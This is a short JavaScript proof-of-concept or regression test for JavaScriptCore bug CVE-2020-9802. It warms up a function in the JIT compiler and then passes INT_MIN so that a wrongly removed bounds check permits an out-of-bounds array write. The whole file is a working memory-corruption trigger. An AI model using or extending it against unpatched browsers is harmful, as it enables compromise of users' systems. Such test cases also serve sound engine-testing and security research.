// jsc: CVE-2020-9802 (Project Zero "JITSploitation I", ArithNegate CSE / bounds check) jit-bounds
function f(arr, n) {
  if (n < 0) {
    let v = (-n) | 0;
    let i = Math.abs(n);
    if (i < arr.length) {
      if (i & 0x80000000) i += -0x7ffffff9;
      if (i > 0) arr[i] = 1.5;
    }
    return v;
  }
  return 0;
}
var arr = new Array(10).fill(0.5);
for (var k = 0; k < 300; k++) f(arr, -(k % 9) - 1);
print(f(arr, -2147483648), arr.length, arr[7]);
print(f(arr, -2147483647), arr.length);
